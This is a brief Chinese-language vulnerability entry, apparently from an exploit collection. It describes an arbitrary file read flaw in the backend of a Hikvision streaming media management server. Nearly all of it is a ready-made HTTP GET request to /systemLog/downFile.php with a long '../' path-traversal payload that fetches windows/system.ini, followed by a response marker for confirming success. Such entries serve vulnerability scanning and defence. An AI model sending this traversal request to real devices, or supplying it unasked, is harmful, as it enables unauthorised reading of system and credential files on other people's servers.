# HIKVISION流媒体管理服务器后台任意文件读取漏洞

海康 ｜ 任意文件读取/写入 ｜ —
- **请求**：`GET /systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini HTTP/1.1`
- **响应特征**：200 support